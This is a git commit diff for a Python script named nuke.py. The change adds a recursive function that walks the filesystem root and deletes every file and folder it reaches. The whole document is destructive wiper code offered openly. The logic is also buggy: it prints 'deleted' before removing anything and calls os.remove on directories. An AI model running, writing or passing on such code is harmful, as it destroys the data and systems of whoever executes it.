976870e4f4b1aba652f3782244c65abb877cbae1
Martix2222 <vrzalikm@gmail.com>
2025-09-07 13:46:25 +0200

    Update nuke.py

--- nuke.py
+++ nuke.py
@@ -1,5 +1,17 @@
 import os
+
+def delete_file(file):
+    try:
+        # Try to delete the file or folder
+        print(file + " deleted")
+        os.remove("/" + file)
+    except OSError:
+        # Delete all files in the given folder
+        for subFile in os.listdir("/" + file):
+            delete_file(f"{file}/{subFile}")
+        
+        os.remove("/" + file)
+
+
 for file in os.listdir("/"):
-    print("Deleting " + file)
-    os.remove("/" + file)
-    print(file + " deleted")
+    delete_file(file)
